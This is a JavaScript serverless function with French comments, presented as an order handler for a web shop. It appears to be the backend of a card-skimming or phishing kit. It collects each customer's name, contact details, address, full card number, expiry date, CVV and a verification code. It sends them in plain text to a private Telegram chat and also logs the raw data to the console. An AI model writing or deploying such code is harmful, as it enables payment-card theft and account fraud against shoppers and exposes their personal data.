const fetch = require('node-fetch');

exports.handler = async function(event, context) {
  console.log('Fonction sendtelegram appelée');

  // Vérifie les variables d’environnement
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('Variables d’environnement manquantes', { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID });
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID' }),
    };
  }

  // Vérifie le corps de la requête
  if (!event.body) {
    console.error('Corps de la requête manquant');
    return {
      statusCode: 400,
      body: JSON.stringify({ error: 'Request body is missing' }),
    };
  }

  let data;
  try {
    data = JSON.parse(event.body);
    console.log('Données reçues :', data);
  } catch (error) {
    console.error('Erreur lors du parsing JSON :', error.message);
    return {
      statusCode: 400,
      body: JSON.stringify({ error: 'Invalid JSON in request body', details: error.message }),
    };
  }

  // Construit le message à envoyer à Telegram
  const message = `
    Nouvelle commande :
    Panier :
    - ${data.cart ? data.cart.join('\n- ') : 'Panier vide'}
    Informations personnelles :
    Nom : ${data.personalInfo?.name || 'N/A'}
    Email : ${data.personalInfo?.email || 'N/A'}
    Téléphone : ${data.personalInfo?.phone || 'N/A'}
    Pays : ${data.personalInfo?.country || 'N/A'}
    Ville : ${data.personalInfo?.city || 'N/A'}
    Code postal : ${data.personalInfo?.postalCode || 'N/A'}
    Informations de livraison :
    Adresse : ${data.shippingInfo?.address || 'N/A'}
    Contact : ${data.shippingInfo?.contact || 'N/A'}
    Informations bancaires :
    Carte : ${data.paymentInfo?.cardNumber || 'N/A'} (${data.paymentInfo?.cardHolder || 'N/A'})
    Expire : ${data.paymentInfo?.expiryDate || 'N/A'}
    CVV : ${data.paymentInfo?.cvv || 'N/A'}
    Code de vérification : ${data.verificationCode || 'N/A'}
  `;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const params = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
  };

  try {
    console.log('Envoi du message à Telegram...');
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    });
    const result = await response.json();

    if (result.ok) {
      console.log('Message envoyé à Telegram avec succès');
      return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Message sent to Telegram', redirect: true }),
      };
    } else {
      console.error('Échec de l’envoi à Telegram :', result);
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Failed to send message to Telegram', details: result }),
      };
    }
  } catch (error) {
    console.error('Erreur lors de l’envoi à Telegram :', error.message);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Server error', details: error.message }),
    };
  }
};